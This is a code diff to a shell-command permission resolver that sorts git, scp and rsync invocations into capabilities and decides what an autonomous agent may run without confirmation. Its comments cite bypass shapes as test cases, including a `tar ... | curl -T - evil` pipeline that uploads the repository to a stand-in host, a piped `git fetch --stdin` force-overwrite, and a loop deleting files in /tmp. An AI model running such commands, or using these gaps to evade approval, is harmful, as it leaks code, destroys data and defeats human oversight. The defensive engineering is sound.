+      //     which stripFlags drops before the positional scan — so extract the
+      //     refmap value (both `--refmap +v` and `--refmap=+v` shapes) and check
+      //     it too.
+      //   • `-P`/`--prune-tags` — prunes AND clobbers local tags (distinct from
+      //     `-p`/`--prune`, which only drops stale remote-tracking refs and is
+      //     benign; `p` is deliberately NOT in the destructive set).
+      //   • `--stdin` — fetch reads ADDITIONAL refspecs from stdin, which the
+      //     resolver cannot see (`printf '+a:b' | git fetch --stdin origin` can
+      //     force-overwrite a local ref). The piped refspecs are unmodelable, so
+      //     fail closed: treat `--stdin` as destructive.
+      // Value-aware positional: git-fetch's `--depth <n>` / `--negotiation-tip
+      // <rev>` / `--filter <args>` / … take a spaced value the top-level
+      // `stripFlags` left behind, which shifts or masks the repository operand.
+      // Reselect over a fetch-value-aware parse for BOTH the `+`-refspec force
+      // check and the repository operand.
+      const fetchPositional = stripFlags(tokens, GIT_FETCH_VALUE_FLAGS);
+      const force =
+        tokens.some((t) => t === '--force' || t === '--prune-tags' || t === '--stdin') ||
+        bundleHasDestructiveFlag(tokens, new Set(['f', 'P']), new Set(['j', 'o'])) ||
+        fetchPositional.slice(1).some((p) => p.startsWith('+')) ||
+        extractValueFlag(tokens, { longForm: '--refmap' }).some((v) => v.startsWith('+'));
+      const fetchRepo = fetchPositional[1];
+      const fetchLocal = fetchRepo !== undefined ? gitRepoLocalPath(fetchRepo) : null;
+      if (fetchLocal !== null) {
+        // A LOCAL repository operand (`git fetch ../other.git`) is a filesystem
+        // read of that repo — outside the workspace, so emit `read-fs:<path>` (no
+        // net-egress) and let the outside-cwd path re-arm the modal. File/dir
+        // transport uses no ssh/proxy/credential helper → no repo-config transport
+        // exec; the tracking-ref write is destructive only on a `+`/`--force` local
+        // ref overwrite (the `force` detection above).
+        return {
+          capabilities: [gitWrite(REPO, force), readFs(REPO), readFs(resolveArg(fetchLocal, ctx))],
+          confidence: 'high',
+        };
       }
-      return { capabilities: [readFs(REPO)], confidence: 'high' };
+      // REMOTE fetch (named remote / URL) — contacts the remote → repo-config
+      // transport exec (see `gitRemoteContactCaps`); gated under autonomous. (The
+      // `force` refinement no longer matters here — the branch is destructive
+      // regardless.)
+      return { capabilities: gitRemoteContactCaps(REPO), confidence: 'high' };
+    }
+    case 'clone':
+      // Network + writes a whole tree. Pre-slice this fell to `default` (low
+      // confidence), which gated it only via the risk score.
+      return {
+        capabilities: [gitWrite(REPO, true), netEgress('*'), writeFs(REPO), readFs(REPO)],
+        confidence: 'high',
+      };
+    case 'clean': {
+      // `git clean` DELETES untracked files/dirs. It requires force to act, but
+      // `clean.requireForce` can be configured off, so fail closed: it is a
+      // destructive delete UNLESS it is an explicit dry run (`-n`/`--dry-run`).
+      // This also fixes the old `/^-f/` test, which matched `-f`/`-fd` but NOT
+      // the `--force` long form (`git clean --force -d` slipped through as a pure
+      // read). `deleteFs` alone reads as repo-confined to the autonomous gate —
+      // the destructive mark is what holds the modal.
+      const dryRun = tokens.some((t) => t === '-n' || t === '--dry-run');
+      if (dryRun) return { capabilities: [readFs(REPO)], confidence: 'high' };
+      return { capabilities: [deleteFs(REPO), gitWrite(REPO, true)], confidence: 'high' };
+    }
+    case 'checkout': {
+      // The legacy overloaded verb: `git checkout <branch>` switches, `git
+      // checkout <pathspec>` / `-- <pathspec>` / `.` RESTORES (discards work),
+      // and the two are not statically decidable. So fail CLOSED — destructive
+      // unless it is unambiguously a NEW-branch create (`-b`/`--orphan`) with no
+      // force/patch/pathspec. `git checkout main` now confirms (git actually
+      // refuses to clobber work without `-f`, but we can't know the operand is a
+      // branch); use `git switch main` for the free path. `-B` is force
+      // create-or-RESET, `-p` discards hunks, `--` introduces pathspecs.
+      const forced = tokens.some(
+        (t) => t === '-f' || t === '--force' || t === '-p' || t === '--patch' || t === '-B',
+      );
+      const createsBranch = tokens.some((t) => t === '-b' || t === '--orphan');
+      const hasPathspecSep = tokens.includes('--');
+      const destructive = forced || hasPathspecSep || !createsBranch;
+      return { capabilities: [gitWrite(REPO, destructive), readFs(REPO)], confidence: 'high' };
+    }
+    case 'switch': {
+      // `git switch` is branch-only by design — it NEVER takes a pathspec, so it
+      // is judged by FLAG alone, never by operand (which fixes the old
+      // over-gate where `git switch feature/login` looked like a path). Discards
+      // work only via `-f`/`--force`/`--discard-changes` or force create-or-reset
+      // (`-C`/`--force-create`). `-c` (plain create) and a bare branch switch are
+      // free. `-c`/`-C` take the new-branch name as their value, so `-cf` is
+      // create-branch-"f" (safe) while `-fc` is force-then-create (destructive) —
+      // the bundle walk with `c` value-consuming gets both right. `--force-create`
+      // takes the name too, so it also appears attached (`--force-create=foo`);
+      // match both spellings (the bundle walk only sees SHORT options).
+      const destructive =
+        tokens.some(
+          (t) =>
+            t === '--force' ||
+            t === '--discard-changes' ||
+            t === '--force-create' ||
+            t.startsWith('--force-create='),
+        ) || bundleHasDestructiveFlag(tokens, new Set(['f', 'C']), new Set(['c']));
+      return { capabilities: [gitWrite(REPO, destructive), readFs(REPO)], confidence: 'high' };
+    }
+    case 'restore': {
+      // `git restore <path>` overwrites the working tree from the index —
+      // discards edits by design. `--staged` ALONE only unstages (index → HEAD,
+      // working tree intact) → non-destructive. `--worktree` (explicit or the
+      // default) and `-p`/`--patch` discard. Fail closed: destructive UNLESS it
+      // is a staged-only restore (`-S`/`--staged` present, and no
+      // `-W`/`--worktree`/`-p`/`--patch`). A bundled `-SW` isn't exactly `-S`, so
+      // it doesn't count as staged-only and stays destructive — correct, since it
+      // carries `W`.
+      const stagedOnly =
+        tokens.some((t) => t === '--staged' || t === '-S') &&
+        !tokens.some((t) => t === '--worktree' || t === '-W' || t === '-p' || t === '--patch');
+      return { capabilities: [gitWrite(REPO, !stagedOnly), readFs(REPO)], confidence: 'high' };
+    }
+    case 'branch': {
+      // Listing and creating are free; deleting (`-d`/`-D`), force-moving/
+      // -renaming (`-f`/`-M`), or force-copying (`-C`) a ref is not. `-m`/`-c`
+      // (plain rename/copy) are non-destructive. The bundle walk catches
+      // `git branch -df doomed` (delete+force, a forced deletion the exact-token
+      // check missed); `-u` consumes the upstream name, so `git branch -u
+      // origin/main` isn't misread as carrying `-d`/`-f` from the branch name.
+      const deletes =
+        tokens.some((t) => t === '--delete' || t === '--force') ||
+        bundleHasDestructiveFlag(tokens, new Set(['d', 'D', 'f', 'M', 'C']), new Set(['u']));
+      return { capabilities: [gitWrite(REPO, deletes), readFs(REPO)], confidence: 'high' };
+    }
     default:
       // Slice 152 (review calibration): unknown git subcommand
       // drops to confidence='low', not 'medium'. The known
@@ -1980,8 +2523,13 @@ const cmdGit: CommandResolver = (positional, tokens, ctx) => {
       // by a wide margin. Pre-slice the default branch was
       // 'medium' (+0.10) which slipped under the threshold for
       // some compositions; 'low' (+0.30) hardens that.
+      //
+      // `destructive: true` is the fail-closed half of the `git-write` mark:
+      // the flag is opt-IN, so a git verb nobody classified must NOT inherit
+      // the non-destructive default and auto-approve under autonomous. An
+      // unknown verb is exactly the case where we cannot claim it is safe.
       return {
-        capabilities: [gitWrite(REPO), readFs(REPO), netEgress('*')],
+        capabilities: [gitWrite(REPO, true), readFs(REPO), netEgress('*')],
         confidence: 'low',
       };
   }
@@ -2938,13 +3486,17 @@ const cmdScp: CommandResolver = (positional, _tokens, ctx) => {
   const sources = positional.slice(0, -1);
   const caps: Capability[] = [readFs(resolveArg('~/.ssh', ctx))];
 
+  // scp is an explicit network TRANSFER tool — mark its egress `explicit`
+  // (sandbox trust-gate, like ssh) AND `transferToolEgress` (so `hasUploadShape`
+  // treats a repo-ROOT source, e.g. `scp -r . host:`, as an upload without
+  // relying on the incidental `~/.ssh` read to gate it).
   if (isRemote(dest)) {
-    caps.push(netEgress(extractHost(dest)));
+    caps.push(netEgress(extractHost(dest), true));
   } else {
     caps.push(writeFs(resolveArg(dest, ctx)));
   }
   for (const s of sources) {
-    if (isRemote(s)) caps.push(netEgress(extractHost(s)));
+    if (isRemote(s)) caps.push(netEgress(extractHost(s), true));
     else caps.push(readFs(resolveArg(s, ctx)));
   }
 
@@ -3163,14 +3715,18 @@ const cmdRsync: CommandResolver = (_positional, tokens, ctx) => {
   for (const p of flagWrites) caps.push(writeFs(resolveArg(p, ctx)));
   for (const p of flagReads) caps.push(readFs(resolveArg(p, ctx)));
 
+  // rsync is an explicit network TRANSFER tool — mark its egress `explicit` +
+  // `transferToolEgress` so `hasUploadShape` catches a repo-ROOT source
+  // (`rsync -a . host:/backup`) directly, not via the incidental `~/.ssh` read
+  // (which a daemon-mode `host::module` doesn't even genuinely touch).
   if (isRemote(dest)) {
-    caps.push(netEgress(extractHost(dest)));
+    caps.push(netEgress(extractHost(dest), true));
   } else {
     caps.push(writeFs(resolveArg(dest, ctx)));
     if (hasDelete) caps.push(deleteFs(resolveArg(dest, ctx)));
   }
   for (const s of sources) {
-    if (isRemote(s)) caps.push(netEgress(extractHost(s)));
+    if (isRemote(s)) caps.push(netEgress(extractHost(s), true));
     else caps.push(readFs(resolveArg(s, ctx)));
   }
 
@@ -4621,12 +5177,36 @@ const classifyRedirects = (
   return { caps, escalated, cwdEscaped };
 };
 
+// Restrictiveness ladder for ConservativeCause. Higher wins when several
+// sub-commands (or a soft wrapper plus an inner miss) contribute a cause.
+// `unmodeled-tool` never originates in the bash resolver — it belongs to the
+// registry's no-resolver fallback — but it is ranked so the function is total.
+const CAUSE_RANK: Record<ConservativeCause, number> = {
+  'unknown-command': 0,
+  'unmodeled-tool': 1,
+  'dynamic-dataflow': 2,
+  'cwd-escape': 3,
+};
+
+const mostRestrictiveCause = (
+  a: ConservativeCause | null,
+  b: ConservativeCause,
+): ConservativeCause => (a === null || CAUSE_RANK[b] > CAUSE_RANK[a] ? b : a);
+
 const analyzeCommand = (
   shape: CommandShape,
   ctx: ResolverContext,
 ):
   | { refuse: string }
-  | { caps: Capability[]; confidence: 'high' | 'medium' | 'low'; conservative?: string } => {
+  | {
+      caps: Capability[];
+      confidence: 'high' | 'medium' | 'low';
+      conservative?: string;
+      // Typed sibling of `conservative`. Set whenever `conservative` is set, so
+      // the aggregate below never has to pattern-match the prose. See
+      // `ConservativeCause` in registry.ts.
+      conservativeCause?: ConservativeCause;
+    } => {
   // Hard-refuse check on BOTH the literal name and a quote/escape-
   // stripped "bare" form. literalText now strips raw_string quotes, but
   // backslash escapes (`\eval`) and mixed forms can still mask a hard
@@ -4735,6 +5315,14 @@ const analyzeCommand = (
   // operand would be dropped. Dedupe against the handler's own caps so a
   // precise-modeling handler (cp/sed/…) doesn't double-count.
   const argCaps: Capability[] = [];
+  // Caps for SENSITIVE (`.env`/`*.pem`) or OUTSIDE-cwd operands — not
+  // `escalate`-tier (so `argCaps` misses them), but exactly what
+  // `capDevLoopConfined` rejects. Used ONLY on the registry-miss (unknown-command)
+  // return: a modeled handler emits its own honest caps, so adding these to the
+  // shared path would over-gate legit commands with a `../` operand. Without them
+  // an unknown command's `unknown-command` conservative auto-approves under
+  // autonomous while taking `.env` / an outside path — the honest-caps claim broke.
+  const looseArgCaps: Capability[] = [];
   if (!isPureOutputCommand(name)) {
     const targets = protectedTargets(ctx.home, ctx.cwd);
     for (const arg of effectiveArgs) {
@@ -4801,6 +5389,10 @@ const analyzeCommand = (
           // op is always 'write' for an unknown command (none are in
           // isReadOnlyCommand); the ternary stays correct if that changes.
           argCaps.push(op === 'write' ? writeFs(abs) : readFs(abs));
+        } else if (matchSensitivePath(abs) !== null || !startsWithSegment(abs, ctx.cwd)) {
+          // Sensitive or outside-cwd operand (not escalate-tier). Registry-miss
+          // only — see `looseArgCaps`.
+          looseArgCaps.push(op === 'write' ? writeFs(abs) : readFs(abs));
         }
         // Slice 178: cwd-scope symlink escape. Lexical inside cwd
         // but canonical outside means a glob policy like
@@ -4844,13 +5436,19 @@ const analyzeCommand = (
     // stays Conservative (confirm) for the normal case; the cap only
     // changes what the §10.1 envelope gate and the score observe.
     return {
-      caps: [exec('arbitrary'), ...redir.caps, ...argCaps],
+      caps: [exec('arbitrary'), ...redir.caps, ...argCaps, ...looseArgCaps],
       confidence: 'low',
       conservative: `unknown_command: ${shape.name}`,
+      // Registry miss. The redirect + arg caps above ARE the honest effect of
+      // the invocation as written (incl. `looseArgCaps` for sensitive/outside-cwd
+      // operands, so a `.env`/`../x` operand re-arms the modal); what we can't see
+      // is inside the binary, and the sandbox's `cwd-rw` floor bounds that.
+      // Auto-approvable in autonomous only when all operands are cwd-confined.
+      conservativeCause: 'unknown-command',
     };
   }
   const positional = stripFlags(effectiveArgs);
-  const result = handler(positional, effectiveArgs, ctx);
+  const result = handler(positional, effectiveArgs, ctx, name);
   if ('refuse' in result) return { refuse: result.refuse };
   let finalConf: 'high' | 'medium' | 'low' = result.confidence;
   if (escalated || redir.escalated) finalConf = 'low';
@@ -4877,6 +5475,9 @@ const analyzeCommand = (
       caps: [...result.capabilities, ...redir.caps, ...extraArgCaps],
       confidence: 'low',
       conservative: 'cwd-scope escape: a path resolves outside the cwd via a symlink',
+      // The caps LIE: lexically inside cwd, canonically outside. Never
+      // auto-approved — this is the slice 176/178 defense.
+      conservativeCause: 'cwd-escape',
     };
   }
 
@@ -4991,6 +5592,9 @@ const bashResolver: Resolver = (args, ctx): ResolverResult => {
         kind: 'conservative',
         capabilities: [exec('shell'), ...orphanRedir.caps, ...loopWordCaps],
         reason: `bash: ${walk.softReason ?? 'unmodeled shape'} (no resolvable command) → confirm`,
+        // Soft wrapper with nothing resolvable inside: the effect is unknowable,
+        // not merely unmodeled. Never auto-approved.
+        cause: 'dynamic-dataflow',
       };
     }
     return { kind: 'refuse', reason: 'bash: no commands recognized' };
@@ -5008,6 +5612,10 @@ const bashResolver: Resolver = (args, ctx): ResolverResult => {
   const allCaps: Capability[] = [exec('shell'), ...orphanRedir.caps, ...loopWordCaps];
   let aggregateConf: 'high' | 'medium' | 'low' = 'high';
   let conservativeReason: string | null = null;
+  // Most restrictive cause wins across the sub-commands. An `unknown-command`
+  // sitting INSIDE a `for` body is `dynamic-dataflow`: the loop makes its caps
+  // best-effort, which is strictly less trustworthy than a bare registry miss.
+  let conservativeCause: ConservativeCause | null = null;
   // Does any sub-command run LOCAL arbitrary code without being an explicit
   // network tool (exec:arbitrary but NO explicitEgress of its own)? Tracked
   // PER-COMMAND — the aggregate `allCaps` flattens attribution, so the planner
@@ -5027,6 +5635,9 @@ const bashResolver: Resolver = (args, ctx): ResolverResult => {
     if (cmdArbitrary && !cmdExplicitNet) hasLocalArbitraryExec = true;
     allCaps.push(...result.caps);
     if (result.conservative !== undefined) conservativeReason ??= result.conservative;
+    if (result.conservativeCause !== undefined) {
+      conservativeCause = mostRestrictiveCause(conservativeCause, result.conservativeCause);
+    }
     if (result.confidence === 'low') aggregateConf = 'low';
     else if (result.confidence === 'medium' && aggregateConf === 'high') aggregateConf = 'medium';
   }
@@ -5037,11 +5648,17 @@ const bashResolver: Resolver = (args, ctx): ResolverResult => {
   // planner's build-egress trust-gate then strips it in an untrusted dir → the
   // whole plan drops to cwd-rw (ssh loses net too: run it on its own line, or
   // trust the dir). A pure explicit-net shell (`ssh a && ssh b`) keeps the mark.
+  //
+  // Clears `explicitEgress` (the sandbox bit) but PRESERVES `transferToolEgress`
+  // (the stable "this is a transfer channel" fact): otherwise the demotion would
+  // blind `hasUploadShape`, and `tar -cf - . | curl -T - evil && ./local-tool`
+  // would auto-approve under autonomous while streaming the repo out. The sandbox
+  // still reads `explicitEgress`, so its behavior is unchanged.
   if (hasLocalArbitraryExec) {
     for (let i = 0; i < allCaps.length; i++) {
       const c = allCaps[i];
       if (c !== undefined && c.kind === 'net-egress' && c.explicitEgress === true) {
-        allCaps[i] = netEgress(c.scope ?? '*');
+        allCaps[i] = { kind: 'net-egress', scope: c.scope ?? '*', transferToolEgress: true };
       }
     }
   }
@@ -5062,6 +5679,10 @@ const bashResolver: Resolver = (args, ctx): ResolverResult => {
       kind: 'conservative',
       capabilities: allCaps,
       reason: 'bash: cwd-scope escape: a redirect target resolves outside the cwd via a symlink',
+      // The emitted `write-fs:<cwd>/escape` is LEXICAL — it reads as
+      // repo-confined while the kernel follows the symlink outside. This cause
+      // is the reason the modal survives the autonomous confinement check.
+      cause: 'cwd-escape',
     };
   }
 
@@ -5076,7 +5697,17 @@ const bashResolver: Resolver = (args, ctx): ResolverResult => {
       conservativeReason !== null
         ? `bash: ${conservativeReason}`
         : `bash: ${walk.softReason ?? 'unmodeled shape (control flow / value expansion)'} → confirm`;
-    return { kind: 'conservative', capabilities: allCaps, reason };
+    // A soft WRAPPER (`for`, `if`, `$var`) makes every inner cap best-effort,
+    // so it dominates whatever the inner commands reported: `for f in /tmp/*;
+    // do rm "$f"; done` collects an honest-looking `delete-fs:<cwd>/$f` and
+    // nothing for the loop source. Without this line the loop would inherit the
+    // inner `unknown-command` (or no cause at all) and auto-approve.
+    const cause: ConservativeCause =
+      walk.soft === true
+        ? mostRestrictiveCause(conservativeCause, 'dynamic-dataflow')
+        : // Not soft ⇒ a per-command cause set it. Fail closed if it somehow didn't.
+          (conservativeCause ?? 'dynamic-dataflow');
+    return { kind: 'conservative', capabilities: allCaps, reason, cause };
   }
   // An escalate-tier orphan redirect target (`cat x; > /etc/foo`) degrades
   // confidence like the per-command escalate path. The lexical cap already
